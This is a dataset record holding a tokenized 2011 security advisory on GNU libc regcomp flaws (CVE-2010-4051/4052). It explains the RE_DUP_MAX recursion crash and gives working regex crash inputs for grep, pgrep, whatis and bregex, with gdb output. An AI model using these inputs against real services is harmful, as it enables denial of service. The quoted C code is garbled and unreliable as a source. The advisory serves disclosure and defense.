{
    "text": "vul_name : GNU libc/regcomp ( 3 ) Multiple Vulnerabilities ， vul_cve : CVE-2010-4051 , CVE-2010-4052 ， vul_poc :  [ GNU libc/regcomp ( 3 ) Multiple Vulnerabilities ]  ， Author : Maksymilian Arciemowicz ， Date :  ， - - Dis. : 01.10.2010 ， - - Pub. : 07.01.2011 ， CERT : VU # 912279 ， CVE :  ， CVE-2010-4051 ， CVE-2010-4052 ， Affected ( tested )  :  ， - - Ubuntu 10.10 ， - - Slackware 13 ， - - Gentoo 18.10.2010 ， - - FreeBSD 8.1 ( grep ( 1 )  ， - - NetBSD 5.0.2 ( grep ( 1 )  ， Exploit for proftpd :  ， - - 0.Description - ， The GNU C library is used as the C library in the GNU system and most systems with the Linux kernel. ，  # define RE_DUP_MAX ( 0x7fff )  ， regcomp (  ) is used to compile a regular expression into a form that is suitable for subsequent regexec (  ) searches. ， - - 1. RE_DUP_MAX overflow - ， The main problem exists in regcomp ( 3 ) function of GNU libc implementation. Let`s try understand. ， int ， regcomp ( preg , pattern , cflags )  ， regex_t * _restrict preg ;  ， const char * _restrict pattern ;  ， int cflags ;  ， { ， / * This function parse repetition operators like \" * \" , \"+\" , \"{1 , 3}\" etc. * / ， static bin_tree_t *  ， parse_dup_op ( bin_tree_t * elem , re_string_t * regexp , re_dfa_t * dfa ,  ， re_token_t * token , reg_syntax_t syntax , reg_errcode_t * err )  ， { ， bin_tree_t * tree = NULL ,  * old_tree = NULL ;  ， int i , start , end , start_idx = re_string_cur_idx ( regexp )  ;  ， re_token_t start_token = * token ;  ， { ， end = 0 ;  ， start = fetch_number ( regexp , token , syntax )  ; <= CONVERT VALUE ， let`s see fetch_number => ， static int ， fetch_number ( re_string_t * input , re_token_t * token , reg_syntax_t syntax )  ， { ， int num = -1 ;  ， unsigned char c ;  ， { ， fetch_token ( token , input , syntax )  ;  ， c = token->opr.c ;  ， num = ( token->type ! = CHARACTER | c < '0' | '9' < c | num = -2 )  ， ? -2 :  ( num = -1 ) ? c - '0' : num * 10 + c - '0' )  ;  ， num = ( num > RE_DUP_MAX ) ? -2 : num ;  ， } ， } ， now see regex.h to know , what value have RE_DUP_MAX ， / * Maximum number of duplicates an interval can allow. Some systems ，  ( erroneously ) define this in other header files , but we want our ， value , so remove any previous define. * / ，  # ifdef RE_DUP_MAX ，  # undef RE_DUP_MAX ，  # endif ， / * If sizeof ( int ) = 2 , then ( 1 15 ) - 1 ) overflows. * / ，  # define RE_DUP_MAX ( 0x7fff )  ，  # endif ， calc_eclosure_iter (  ) will call to calc_eclosure_iter (  ) match time. and ， crash in malloc ( 3 ) . Simple Recursion. ， so we can't use value bigger 0x7fff in {n , }. regcomp ( 3 ) should return ERROR if we use more that one time '{' token. ， They are many vectors attack ， grep ( 1 )  :  ， cx @ cx64 :  ~  $ ls | grep -E \". * {10 , }{10 , }{10 , }{10 , }{10 , }\" ， Segmentation fault ， pgrep ( 1 )  :  ， cx @ cx64 :  ~  $ pgrep \". * {10 , }{10 , }{10 , }{10 , }{10 , }\" ， Segmentation fault ， bregex from bacula-director-common ， cx @ cx64 :  ~  $ bregex -f glob-0day.c ， Enter regex pattern : . * {10 , }{10 , }{10 , }{10 , }{10 , } ， Segmentation fault ， whatis ( 1 )  :  ， cx @ cx64 :  ~  $ whatis -r \". * {10 , }{10 , }{10 , }{10 , }{10 , }\" ， Segmentation fault ， and more like proftpd. ， Simple crash for CVE-2010-4051 ，  ( gdb ) x/i $ rip ， => 0x7ffff7ad3ea2 : mov %eax , 0x50 ( %rsp )  ，  ( gdb ) x/i $ eax ， 0x2 : Cannot access memory at address 0x2 ，  ( gdb ) x/i $ rsp ， 0x7fffff5fef90 : Cannot access memory at address 0x7fffff5fef90 ，  ( gdb ) x/i 0x50 (  $ rsp )  ， Cannot access memory at address 0x7fffff5fef08 ，  # 0 0x00007ffff7ad3ea2 in ? (  ) from /lib/libc.so.6 ，  # 1 0x00007ffff7ad538e in malloc (  ) from /lib/libc.so.6 ，  # 2 0x00007ffff7b17d9b in ? (  ) from /lib/libc.so.6 ，  # 3 0x00007ffff7b17f0b in ? (  ) from /lib/libc.so.6 ，  # 4 0x00007ffff7b17f0b in ? (  ) from /lib/libc.so.6 ，  # 5 0x00007ffff7b17f0b in ? (  ) from /lib/libc.so.6 ，  # 6 0x00007ffff7b17f0b in ? (  ) from /lib/libc.so.6 ，  # 7 0x00007ffff7b17f0b in ? (  ) from /lib/libc.so.6 ， . ， - -PoC1-",
    "time": "2011-01-07 / 2012-03-12"
}